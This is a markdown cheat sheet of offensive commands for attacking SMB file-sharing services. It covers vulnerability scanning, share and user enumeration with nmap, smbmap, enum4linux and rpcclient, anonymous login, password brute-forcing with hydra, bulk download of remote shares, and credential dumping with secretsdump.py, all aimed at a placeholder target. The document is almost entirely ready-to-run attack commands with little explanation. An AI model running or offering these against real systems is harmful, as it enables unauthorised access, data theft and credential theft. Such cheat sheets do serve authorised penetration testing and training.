<h1>Target SMB service</h1> 

**Summery:** 

- [Enumeration](#enumeration)
  - [nmap](#nmap)
  - [nbtscan](#nbtscan)
  - [nmblookup (nbtstat)](#nmblookup-nbtstat)
  - [smbmap](#smbmap)
  - [enum4linux](#enum4linux)
- [Connect](#connect)
  - [crackmapexec](#crackmapexec)
- [Brut Force](#brut-force)
  - [hydra](#hydra)
  - [nmap](#nmap-1)
- [Download all the dir](#download-all-the-dir)
- [Mount remote dir](#mount-remote-dir)
- [Dump Secrets](#dump-secrets)

## Enumeration

### nmap
    nmap --script smb-vuln* -p 445 TARGET_IP

    nmap -p 139,445 --script vuln -oA nmap-Vuln TARGET_IP

    nmap --script smb-enum-shares -p 139,445 TARGET_IP
    nmap --script=smb-enum-shares --script-args=unsafe=1 -T5 $ip

### nbtscan
    nbtscan -r TARGET_IP

### nmblookup (nbtstat)
    nmblookup -A TARGET_IP

### smbmap
    
    smbmap -H TARGET_IP -u guest
    smbmap -H TARGET_IP -R --depth 5

    -R : PATH + the depth
    
    smbmap -H TARGET_IP -u USERNAME -p PASSWORD
### enum4linux

    enum4linux -a TARGET_IP
    
## Connect 
Anonymous connection:

    smbclient -L //TARGET_IP
    smbclient \\\\TARGET_IP\\<DIR>

User connection:

    smbclient -L //TARGET_IP -U <User>

Client mount:

> rpcclient
> 
    rpcclient -U "" -N TARGET_IP
    rpcclient -U "guest" -N TARGET_IP

Interaction 

    rpcclient
    > enumdomusers

    user:[Guest] rid:[0x1f5]
    user:[AAD_987d7f2f57d2] rid:[0x450]

    > enumdomgroups

    smbclient -L //TARGET_IP -U <User>

Client mount:

> showmount
> 
    showmount -e TARGET_IP

### crackmapexec

    cme smb TARGET_IP -u '' -p ''
    cme smb TARGET_IP -u USERNAME -p 'PASSWORD' --shares

## Brut Force 
### hydra

    hydra -L user.txt -P pass.txt TARGET_IP smb
### nmap
    nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 TARGET_IP/24


## Download all the dir 
> smbclient

    smbclient \\\\TARGET_IP\\DIR
    recurse ON
    prompt OFF
    mget *

> smbget
> 
    smbget -R 'smb://TARGET_IP/DIR' -U USERNAME


## Mount remote dir 
    mkdir /mnt/remoteDir
    sudo mount -t cifs -o user=guest //TARGET_IP/<DIR> /mnt/remoteDir


## Dump Secrets


    secretsdump.py 'DOAMIN/USERNAME:PASSWORD@TARGET_IP'